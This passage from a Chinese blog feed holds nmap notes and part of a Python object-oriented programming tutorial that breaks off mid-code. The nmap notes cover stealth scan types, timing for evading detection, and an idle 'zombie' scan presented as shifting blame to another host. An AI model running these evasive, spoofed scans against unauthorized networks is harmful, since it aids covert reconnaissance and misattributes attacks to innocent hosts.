style="text-align:center">确定某个特定的UDP端口是否开放</td></tr><tr><td style="text-align:center">-sX</td><td style="text-align:center">XMAS扫描</td><td style="text-align:center">隐蔽扫描，对扫描特定配置的防火墙非常有用，通过RST包来判断端口是否关闭，扫描UNIX系统效果较好</td></tr><tr><td style="text-align:center">-sL</td><td style="text-align:center">列出扫描对象</td><td style="text-align:center">列出将要扫描出的IP地址，使用-n确保不向网络中发送数据包</td></tr><tr><td style="text-align:center">-sO</td><td style="text-align:center">IP协议扫描</td><td style="text-align:center">寻找使用IP协议的主机</td></tr><tr><td style="text-align:center">-sM</td><td style="text-align:center">FIN/ACK</td><td style="text-align:center">隐蔽扫描。基于UNIX系统，查找RST数据包</td></tr><tr><td style="text-align:center">-sI</td><td style="text-align:center">闲置扫描</td><td style="text-align:center">僵尸主机扫描，非常隐蔽</td></tr><tr><td style="text-align:center">-sW</td><td style="text-align:center">窗口扫描</td><td style="text-align:center">检查RST包的TCP窗口值判断端口是否开放</td></tr></tbody></table><p>输出格式</p><table><thead><tr><th>输出格式</th><th>名称</th><th>功能</th></tr></thead><tbody><tr><td>-oA</td><td>所有</td><td>可检索的，常规的XML文件</td></tr><tr><td>-oG</td><td>可检索的</td><td>可检索的格式</td></tr><tr><td>-oX</td><td>XML</td><td>结果输出成XML格式</td></tr><tr><td>-oN</td><td>常规</td><td>适合人阅读的格式</td></tr></tbody></table><p><strong>控制时间</strong></p><ul><li>-T ( 0 -5 ):  让你能够控制扫描的激进程序， 避免被检测到的最简单方式，  0 是最温和的扫描。 5 是最激进的只能在局域网中使用。</li><li>–max-hostgroup: 可将扫描的主机数量限制在一次一个。</li><li>–max-parallelism 10 : 一次仅允许10个探测请求。</li><li>–scan-delay：     允许你在两个探测之间停顿。</li></ul><h4 id="转嫁责任-僵尸扫描"><a href="#转嫁责任-僵尸扫描" class="headerlink" title="转嫁责任 -  僵尸扫描"></a>转嫁责任 -  僵尸扫描</h4><p>如果不被检测到的几率非常小，我们需要转嫁责任，可以使用空闲扫描 (idle scan), 让一个僵尸主机承担我们的扫描任务。</p><p>使用空闲扫描(-sI) 有一个重要的问题需要注意。必须找一台TCP Sequence Predicetion成功率高的僵尸主机。 如打印机，因为他们不存在恒定的网络流量，而且预测它们的TCP序列难度很低。</p><p><strong>第一步： 寻找可能的僵尸主机</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -v -O -Pn -n 192.168.2.13   ##分别: 详细，操作系统检测，无ping，无域名解析</span><br></pre></td></tr></table></figure><p>显示内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Network Distance: 0 hops</span><br><span class="line">TCP Sequence Prediction: Difficulty=261 (Good luck!)</span><br><span class="line">IP ID Sequence Generation: All zeros</span><br></pre></td></tr></table></figure><blockquote><p> 空闲扫描原理:</p><ol><li>向僵尸主机发送 SYN/ACK数据包，从而得到带有分片ID(IPID)的RST报文。</li><li>发送使用僵尸主机IP地址的伪造数据包给目标主机。</li><li>如果目标端口关闭，将会给僵尸主机响应RST报文。如果目标端口开放。目标主机将向僵尸主机响应 SYN/ACK报文，僵尸主机发现这个非法的链接响应，因此向目标主机发送RST报文，这时IPID号开始增长。</li><li>通过向僵尸主机发送另一个SYN/ACK以退出上述循环并检查僵尸主机RST报文中的IPID是否每次增长2，同时目标主机的RST每次增长1.</li><li>重复以上步骤直到检测完主机的所有端口。</li></ol></blockquote><p><strong>空闲扫描语法:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 23,53,80   -Pn  -sI   192.168.2.13   192.168.2.254</span><br></pre></td></tr></table></figure><p>指定特定端口，-Pn强调不使用ping(默认提供)，然后启动空闲扫描(-sI),  使用192.168.2.13作为僵尸主机， 192.168.2.254作为目标主机</p><p><br></p><h4 id="nmap-脚本"><a href="#nmap-脚本" class="headerlink" title="nmap 脚本"></a>nmap 脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">SCRIPT SCAN:</span><br><span class="line">-sC: equivalent to --script=default</span><br><span class="line">--script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">         directories, script-files or script-categories</span><br><span class="line">--script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">--script-args-file=filename: provide NSE script args in a file</span><br><span class="line">--script-trace: Show all data sent and received</span><br><span class="line">--script-updatedb: Update the script database.</span><br><span class="line">--script-help=&lt;Lua scripts&gt;: Show help about scripts.</span><br><span class="line">         &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">         script-categories.</span><br></pre></td></tr></table></figure><p>-sC 是指的是采用默认配置扫描，与–script=default参数等价</p><p>–script=脚本名称，脚本一般都在Nmap的安装目录下的scripts目录中</p><p>那么Linux下可以查看脚本数量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts/ | wc -l</span><br><span class="line">516</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 如果目录可以使用 find / -iname scripts -type d | grep nmap 来查找</span><br></pre></td></tr></table></figure><p>那么我当前的Nmap是有516个很使用的漏洞利用、工具脚本。也可以使用下面一条命令导出 ～</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts/ | sed &apos;s/.nse//&apos; &gt; scripts.list</span><br></pre></td></tr></table></figure><p>那么所有的脚本名称都在scripts.list中了，这样做的原因是因为我们传递脚本名称的时候，不能写脚本的文件扩展名(.nse)。</p><p><code>--script-args=key1=value1,key2=value2...</code>  该参数是用来传递脚本里面的参数的，key1是参数名，该参数对应value1这个值，那么有更多的参数，使用逗号连接，后面例子中会给大家讲解。</p><p><code>–script-args-file=filename</code>，使用文件来为脚本提供参数。 </p><p><code>--script-trace</code> 如果设置该参数，则所有的脚本收发请求过程。</p><p><code>--script-updatedb</code> 在Nmap的scripts目录里有一个script.db，该文件中保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启nmap并且调用了此参数，则nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</p><p><code>--script-help=脚本名称</code>，调用该参数后，Nmap会输出该脚本名称对应的脚本使用参数，以及详细介绍信息。</p><p><a href="https://zhuanlan.zhihu.com/p/26618074" target="_blank" rel="noopener">脚本使用</a></p><p><a href="http://drops.xmd5.com/static/drops/tips-4333.html" target="_blank" rel="noopener">Nmap 示例</a></p>]]></content>
      
      
      <categories>
          
          <category> 命令篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-面向对象</title>
      <link href="/2018/01/13/gram/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"/>
      <url>/2018/01/13/gram/Python-%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<ul><li>模块<ul><li>使用模块</li><li>作用域</li></ul></li><li>作用域<ul><li>内置函数</li><li>访问限制</li><li>继承与多态</li></ul></li><li>面向对象高级编程<ul><li><strong>slot</strong></li><li>@property</li><li>枚举类</li></ul></li></ul><a id="more"></a><p><br></p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。<strong>在Python中，一个.py文件就称之为一个模块（Module）。</strong></p><p>使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。但是也要注意，尽量不要与内置函数名字冲突。点<a href="http://docs.python.org/3/library/functions.html" target="_blank" rel="noopener">这里</a>查看Python的所有内置函数。</p><p>如果不同的人编写的模块名相同怎么办？<strong>为了避免模块名冲突，Python又引入了按目录来组织模块的方法，称为包（Package）。</strong></p><p>举个例子，一个<code>abc.py</code>的文件就是一个名字叫<code>abc</code>的模块，一个<code>xyz.py</code>的文件就是一个名字叫<code>xyz</code>的模块。</p><p>现在，假设我们的<code>abc</code>和<code>xyz</code>这两个模块名字与其他模块冲突了，于是我们可以通过包来组织模块，避免冲突。方法是选择一个顶层包名，比如<code>mycompany</code>，按照如下目录存放：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mycompany</span><br><span class="line">├─ __init__.py</span><br><span class="line">├─ abc.py</span><br><span class="line">└─ xyz.py</span><br></pre></td></tr></table></figure><p>引入了包以后，只要顶层的包名不与别人冲突，那所有模块都不会与别人冲突。现在，<code>abc.py</code>模块的名字就变成了<code>mycompany.abc</code>，类似的，<code>xyz.py</code>的模块名变成了<code>mycompany.xyz</code>。</p><p>每一个包目录下面都会有一个<code>__init__.py</code>的文件，这个文件是必须存在的，否则，Python就把这个目录当成普通目录，而不是一个包。<code>__init__.py</code>可以是空文件，也可以有Python代码，因为<code>__init__.py</code>本身就是一个模块，而它的模块名就是<code>mycompany</code>。</p><h4 id="使用模块"><a href="#使用模块" class="headerlink" title="使用模块"></a>使用模块</h4><p>我们以内建的<code>sys</code>模块为例，编写一个<code>hello</code>的模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">&apos; a test module &apos;</span><br><span class="line"></span><br><span class="line">__author__ = &apos;Michael Liao&apos;</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">def test():</span><br><span class="line">    args = sys.argv</span><br><span class="line">    if len(args)==1:</span><br><span class="line">        print(&apos;Hello, world!&apos;)</span><br><span class="line">    elif len(args)==2:</span><br><span class="line">        print(&apos;Hello, %s!&apos; % args[1])</span><br><span class="line">    else:</span><br><span class="line">        print(&apos;Too many arguments!&apos;)</span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>第1行和第2行是标准注释，第1行注释可以让这个<code>hello.py</code>文件直接在Unix/Linux/Mac上运行，第2行注释表示.py文件本身使用标准UTF-8编码；</p><p>第4行是一个字符串，表示模块的文档注释，任何模块代码的第一个字符串都被视为模块的文档注释；</p><p>第6行使用<code>__author__</code>变量把作者写进去，这样当你公开源代码后别人就可以瞻仰你的大名；</p><p>以上就是Python模块的标准文件模板，当然也可以全部删掉不写，但是，按标准办事肯定没错。</p><p>后面开始就是真正的代码部分。</p><p>你可能注意到了，使用<code>sys</code>模块的第一步，就是导入该模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import sys</span><br></pre></td></tr></table></figure><p>导入<code>sys</code>模块后，我们就有了变量<code>sys</code>指向该模块，利用<code>sys</code>这个变量，就可以访问<code>sys</code>模块的所有功能。</p><p><code>sys</code>模块有一个<code>argv</code>变量，用list存储了命令行的所有参数。<code>argv</code>至少有一个元素，因为第一个参数永远是该.py文件的名称，例如：</p><p>运行<code>python3 hello.py</code>获得的<code>sys.argv</code>就是<code>[&#39;hello.py&#39;]</code>；</p><p>运行<code>python3 hello.py Michael</code>获得的<code>sys.argv</code>就是<code>[&#39;hello.py&#39;, &#39;Michael]</code>。</p><p>最后，注意到这两行代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><p>当我们在命令行运行<code>hello</code>模块文件时，Python解释器把一个特殊变量<code>__name__</code>置为<code>__main__</code>，而如果在其他地方导入该<code>hello</code>模块时，<code>if</code>判断将失败，因此，这种<code>if</code>测试可以让一个模块通过命令行运行时执行一些额外的代码，最常见的就是运行测试。</p><p>我们可以用命令行运行<code>hello.py</code>看看效果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 hello.py</span><br><span class="line">Hello, world!</span><br><span class="line">$ python hello.py Michael</span><br><span class="line">Hello, Michael!</span><br></pre></td></tr></table></figure><p>如果启动Python交互环境，再导入<code>hello</code>模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ python3</span><br><span class="line">Python 3.4.3 (v3.4.3:9b73f1c3e601, Feb 23 2015, 02:52:03) </span><br><span class="line">[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin</span><br><span class="line">Type &quot;help&quot;, &quot;copyright&quot;, &quot;credits&quot; or &quot;license&quot; for more information.</span><br><span class="line">&gt;&gt;&gt; import hello</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>导入时，没有打印<code>Hello, word!</code>，因为没有执行<code>test()</code>函数。</p><p>调用<code>hello.test()</code>时，才能打印出<code>Hello, word!</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hello.test()</span><br><span class="line">Hello, world!</span><br></pre></td></tr></table></figure><h4 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h4><p>在一个模块中，我们可能会定义很多函数和变量，但有的函数和变量我们希望给别人使用，有的函数和变量我们希望仅仅在模块内部使用。在Python中，是通过<code>_</code>前缀来实现的。</p><p><strong>正常的函数和变量名是公开的（public），可以被直接引用，比如：<code>abc</code>，<code>x123</code>，<code>PI</code>等；</strong> </p><p><strong>类似<code>__xxx__</code>这样的变量是特殊变量，可以被直接引用，但是有特殊用途，</strong> 比如上面的<code>__author__</code>，<code>__name__</code>就是特殊变量，<code>hello</code>模块定义的文档注释也可以用特殊变量<code>__doc__</code>访问，我们自己的变量一般不要用这种变量名；</p><p><strong>类似<code>_xxx</code>和<code>__xxx</code>这样的函数或变量就是非公开的（private），不应该被直接引用，比如<code>_abc</code>，<code>__abc</code>等；</strong> </p><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="类和实例"><a href="#类和实例" class="headerlink" title="类和实例"></a>类和实例</h4><p>类(class) 和 实例 (instance) ， 类是抽象的模板,  实例是根据类创建出来的一个个具体的”对象”, 每个对象都拥有相同的方法, 但各自的数据可能不同。</p><p>在Python中，定义类是通过<code>class</code>关键字：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p><code>class</code>后面紧接着是类名，即<code>Student</code>，类名通常是大写开头的单词，紧接着是<code>(object)</code>，表示该类是从哪个类继承下来的，继承的概念我们后面再讲，通常，如果没有合适的继承类，就使用<code>object</code>类，这是所有类最终都会继承的类。</p><h4 id="init-与-数据封装"><a href="#init-与-数据封装" class="headerlink" title="__init__  与 数据封装"></a>__init__  与 数据封装</h4><p><code>__init__</code>方法的第一个参数永远是<code>self</code>，表示创建的实例本身，因此，在<code>__init__</code>方法内部，就可以把各种属性绑定到<code>self</code>，因为<code>self</code>就指向创建的实例本身。</p><p>定义一个特殊的<code>__init__</code>方法，在创建实例的时候，就把<code>name</code>，<code>score</code>等属性绑上去：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.score = score</span><br></pre></td></tr></table></figure><p>和普通的函数相比，在类中定义的函数只有一点不同，就是第一个参数永远是实例变量<code>self</code>，并且，调用时，不用传递该参数。除此之外，类的方法和普通函数没有什么区别，所以，你仍然可以用默认参数、可变参数、关键字参数和命名关键字参数。</p><h4 id="str"><a href="#str" class="headerlink" title="__str__"></a>__str__</h4><p><code>__str__()</code>返回用户看到的字符串</p><p>只需要定义好<code>__str__()</code>方法，返回一个好看的字符串就可以了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Student(object):</span><br><span class="line">...     def __init__(self, name):</span><br><span class="line">...         self.name = name</span><br><span class="line">...     def __str__(self):</span><br><span class="line">...         return &apos;Student object (name: %s)&apos; % self.name</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; print(Student(&apos;Michael&apos;))</span><br><span class="line">Student object (name: Michael)</span><br></pre></td></tr></table></figure><p>这样打印出来的实例，不但好看，而且容易看出实例内部重要的数据。</p><h4 id="repr"><a href="#repr" class="headerlink" title="__repr__"></a>__repr__</h4><p>而<code>__repr__()</code>返回程序开发者看到的字符串</p><p>有个偷懒的写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line">    def __init__(self, name):</span><br><span class="line">        self.name = name</span><br><span class="line">    def __str__(self):</span><br><span class="line">        return &apos;Student object (name=%s)&apos; % self.name</span><br><span class="line">    __repr__ = __str__</span><br></pre></td></tr></table></figure><h4 id="iter"><a href="#iter" class="headerlink" title="__iter__"></a>__iter__</h4><p>如果一个类想被用于<code>for ... in</code>循环，类似list或tuple那样，就必须实现一个<code>__iter__()</code>方法，该方法返回一个迭代对象，然后，Python的for循环就会不断调用该迭代对象的<code>__next__()</code>方法拿到循环的下一个值，直到遇到<code>StopIteration</code>错误时退出循环。</p><p>我们以斐波那契数列为例，写一个Fib类，可以作用于for循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">class Fib(object):</span><br><span class="line">    def __init__(self):</span><br><span class="line">        self.a, self.b = 0, 1 # 初始化两个计数器a，b</span><br><span class="line"></span><br><span class="line">    def __iter__(self):</span><br><span class="line">        return self # 实例本身就是迭代对象，故返回自己</span><br><span class="line"></span><br><span class="line">    def __next__(self):</span><br><span class="line">        self.a, self.b = self.b, self.a + self.b # 计算下一个值</span><br><span class="line">        if self.a &gt; 100000: # 退出循环的条件</span><br><span class="line">            raise StopIteration()</span><br><span class="line">        return self.a # 返回下一个值</span><br></pre></td></tr></table></figure><p>现在，试试把Fib实例作用于for循环：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; for n in Fib():</span><br><span class="line">...     print(n)</span><br><span class="line">...</span><br><span class="line">1</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">...</span><br><span class="line">46368</span><br><span class="line">75025</span><br></pre></td></tr></table></figure><h4 id="访问限制"><a href="#访问限制" class="headerlink" title="访问限制"></a>访问限制</h4><p>在class内部，可以有属性和方法，而外部代码可以通过直接调用实例变量的方法来操作数据，这样就隐藏了复杂逻辑。</p><p>但外部代码还是可以自由的修改一个实例的name，和score等属性。</p><p>如果要让内部属性不被外部访问，可以把属性的名称前加上两个下划线<code>__</code>，在Python中，实例的变量名如果以<code>__</code>开头，就变成了一个私有变量（private），只有内部可以访问，外部不能访问，所以，我们把Student类改一改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">class Student(object):</span><br><span class="line"></span><br><span class="line">    def __init__(self, name, score):</span><br><span class="line">        self.__name = name</span><br><span class="line">        self.__score = score</span><br><span class="line"></span><br><span class="line">    def print_score(self):</span><br><span class="line">        print(&apos;%s: %s&apos; % (self.__name, self.__score))</span><br></pre></td></tr></table></figure><p>改完后，对于外部代码来说，没什么变动，但是已经无法从外部访问<code>实例变量.__name</code>和<code>实例变量.__score</code>了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; bart = Student(&apos;Bart Simpson&apos;, 59)</span><br><span class="line">&gt;&gt;&gt; bart.__name</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">AttributeError: &apos;Student&apos; object has no attribute &apos;__name&apos;</span><br></pre></td></tr></table></figure><p>可以查看<a href="">模块-作用域</a></p><h4 id="继承-和-多态"><a href="#继承-和-多态" class="headerlink" title="继承 和 多态"></a>继承 和 多态</h4><p>在OOP程序设计中，当我们定义一个class的时候，可以从某个现有的class继承，新的class称为子类（Subclass），而被继承的class称为基类、父类或超类（Base class、Super class）。</p><p>比如，我们已经编写了一个名为<code>Animal</code>的class，有一个<code>run()</code>方法可以直接打印：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class Animal(object):</span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Animal is running...&apos;)</span><br></pre></td></tr></table></figure><p>当我们需要编写<code>Dog</code>和<code>Cat</code>类时，就可以直接从<code>Animal</code>类继承：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">class Cat(Animal):</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>对于<code>Dog</code>来说，<code>Animal</code>就是它的父类，对于<code>Animal</code>来说，<code>Dog</code>就是它的子类。<code>Cat</code>和<code>Dog</code>类似。</p><p>继承有什么好处？最大的好处是子类获得了父类的全部功能。由于<code>Animial</code>实现了<code>run()</code>方法，因此，<code>Dog</code>和<code>Cat</code>作为它的子类，什么事也没干，就自动拥有了<code>run()</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dog = Dog()</span><br><span class="line">dog.run()</span><br><span class="line"></span><br><span class="line">cat = Cat()</span><br><span class="line">cat.run()</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Animal is running...</span><br><span class="line">Animal is running...</span><br></pre></td></tr></table></figure><p>当然，也可以对子类增加一些方法，比如Dog类：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Dog is running...&apos;)</span><br><span class="line"></span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&apos;Eating meat...&apos;)</span><br></pre></td></tr></table></figure><p>继承的第二个好处需要我们对代码做一点改进。你看到了，无论是<code>Dog</code>还是<code>Cat</code>，它们<code>run()</code>的时候，显示的都是<code>Animal is running...</code>，符合逻辑的做法是分别显示<code>Dog is running...</code>和<code>Cat is running...</code>，因此，对<code>Dog</code>和<code>Cat</code>类改进如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class Dog(Animal):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Dog is running...&apos;)</span><br><span class="line"></span><br><span class="line">class Cat(Animal):</span><br><span class="line"></span><br><span class="line">    def run(self):</span><br><span class="line">        print(&apos;Cat is running...&apos;)</span><br></pre></td></tr></table></figure><p>再次运行，结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Dog is running...</span><br><span class="line">Cat is running...</span><br></pre></td></tr></table></figure><p>当子类和父类都存在相同的<code>run()</code>方法时，我们说，子类的<code>run()</code>覆盖了父类的<code>run()</code>，在代码运行的时候，总是会调用子类的<code>run()</code>。这样，我们就获得了继承的另一个好处：多态。</p><p>要理解什么是多态，我们首先要对数据类型再作一点说明。当我们定义一个class的时候，我们实际上就定义了一种数据类型。我们定义的数据类型和Python自带的数据类型，比如str、list、dict没什么两样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = list() # a是list类型</span><br><span class="line">b = Animal() # b是Animal类型</span><br><span class="line">c = Dog() # c是Dog类型</span><br></pre></td></tr></table></figure><p>判断一个变量是否是某个类型可以用<code>isinstance()</code>判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(a, list)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(b, Animal)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(c, Dog)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>看来<code>a</code>、<code>b</code>、<code>c</code>确实对应着<code>list</code>、<code>Animal</code>、<code>Dog</code>这3种类型。</p><p>但是等等，试试：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; isinstance(c, Animal)</span><br><span class="line">True</span><br></pre></td></tr></table></figure><p>看来<code>c</code>不仅仅是<code>Dog</code>，<code>c</code>还是<code>Animal</code>！</p><p>不过仔细想想，这是有道理的，因为<code>Dog</code>是从<code>Animal</code>继承下来的，当我们创建了一个<code>Dog</code>的实例<code>c</code>时，我们认为<code>c</code>的数据类型是<code>Dog</code>没错，但<code>c</code>同时也是<code>Animal</code>也没错，<code>Dog</code>本来就是<code>Animal</code>的一种！</p><p>所以，在继承关系中，如果一个实例的数据类型是某个子类，那它的数据类型也可以被看做是父类。但是，反过来就不行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; b = Animal()</span><br><span class="line">&gt;&gt;&gt; isinstance(b, Dog)</span><br><span class="line">False</span><br></pre></td></tr></table></figure><p><code>Dog</code>可以看成<code>Animal</code>，但<code>Animal</code>不可以看成<code>Dog</code>。</p><p>要理解多态的好处，我们还需要再编写一个函数，这个函数接受一个<code>Animal</code>类型的变量：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def run_twice(animal):</span><br><span class="line">    animal.run()</span><br><span class="line">    animal.run()</span><br></pre></td></tr></table></figure><p>当我们传入<code>Animal</code>的实例时，<code>run_twice()</code>就打印出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 